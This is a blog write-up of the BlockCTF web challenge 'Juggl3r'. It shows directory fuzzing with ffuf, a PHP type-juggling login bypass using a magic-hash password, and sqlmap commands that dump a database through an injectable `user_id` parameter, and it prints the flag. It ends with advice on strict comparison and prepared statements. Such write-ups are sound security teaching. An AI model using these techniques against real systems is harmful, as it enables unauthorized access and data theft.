---
title: "Juggl3r"
summary: "Juggler challenge from blockctf"
categories: ["Blockctf","Blog",]
tags: ["Blockctf","web"]
#externalUrl: ""
#showSummary: true
date: 2024-11-18
draft: false
---


# **Challenge Description**

- **Name:** Juggl3r
- **Category:** Web Exploitation
- **Points:** 200
- **Challenge Description:**  
    The admin panel seems locked behind some odd logic, and the flag is hidden deep. Can you bypass the checks and uncover the secret?  
    URL: [[http://54.85.45.101:8080/](http://54.85.45.101:8080/)]

---

# Solution

## enumeration

To begin, I scanned the target for directories and files using `ffuf`.
```shell
ffuf -u http://54.85.45.101:8080/FUZZ -ac -w /home/wordlists/SecLists/Discovery/Web-Content/combined_words.txt
```
![[Pasted image 20241114151734.png]]
**Result:**  
The scan revealed a `/src` directory that indexed several files. Among them, `config.php` and `init.sql` stood out as interesting.

- `config.php`: Empty.
- `init.sql`: Contained SQL instructions and sensitive data.
![[Pasted image 20241114152221.png]]

Here is the content of `init.sql`:
```php

if (isset($_GET['user_id'])) {
    $user_id = $_GET['user_id'];

    $sql = "SELECT * FROM users WHERE id = $user_id";
    $stmt = $conn->query($sql);

    if ($stmt && $user = $stmt->fetch()) {
        $message = "User found: " . htmlspecialchars($user['username']);
    } else {
        $message = "User not found.";
    }
} else {
    $message = "Please provide a user ID.";
}
```

## PHP Type Juggling Vulnerability

The `admin` user’s hash (`0e662...`) raised a red flag. This format is often indicative of a PHP type juggling vulnerability, especially when combined with weak comparison logic. The challenge name, "Juggl3r," further hinted at this issue.

### What is PHP Type Juggling?

PHP’s loose comparison (`==`) can interpret strings that start with `0e` as scientific notation (`0e+...`), which equals zero. If both a user-provided string and a stored hash evaluate to the same numeric value (`0`), the comparison will succeed.

### Exploitation

Researching SHA-256 "magic hashes" led me to a payload that produces the same hash as `0e662...`:

- **Username:** `admin`
- **Password:** `TyNOQHUS`

I logged in successfully with these credentials, accessing the admin panel.

---

## SQL Injection on `admin.php`

Once inside, I noticed that the admin panel’s URL included a `user_id` parameter:
```
http://54.85.45.101:8080/admin.php?user_id=1
```
![[Pasted image 20241119135439.png]]

By reviewing the `/src/admin.php` file, I discovered the following vulnerable code:

```php

$sql = "SELECT * FROM users WHERE id = $user_id";
$stmt = $conn->query($sql);

```

The query concatenates user input directly, making it susceptible to SQL Injection (SQLi). Using `sqlmap`, I automated the exploitation to enumerate databases and dump sensitive information.

### SQLi Steps

1. **Enumerate Databases:**
    
    ```shell
    sqlmap -u "http://54.85.45.101:8080/admin.php?user_id=1" --cookie="PHPSESSID=..." --dbs
    ```
    
    ![[Pasted image 20241114161202.png]]
    
2. **Enumerate Tables in `ctf_challenge`:**
    
    ```shell
    sqlmap -u "http://54.85.45.101:8080/admin.php?user_id=1" --cookie="PHPSESSID=..." -D ctf_challenge --tables
	```
    
    ![[Pasted image 20241114161128.png]]
    
3. **Dump the Flag:**
    
    ```shell

    sqlmap -u "http://54.85.45.101:8080/admin.php?user_id=1" --cookie="PHPSESSID=..." -D ctf_challenge -T flags --dump

    ```
    
    ![[Pasted image 20241114161051.png]]

---

# Flag

flag{juggl3_inject}

---

### **Key Takeaways**

1. **PHP Type Juggling:**  
    Always use strict comparison (`===`) to avoid vulnerabilities when handling user input and hashes.
    
2. **SQL Injection Prevention:**
    
    - Use prepared statements or parameterized queries.
    - Sanitize and validate user inputs.

---

### **References**

- OWASP: PHP Type Juggling
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)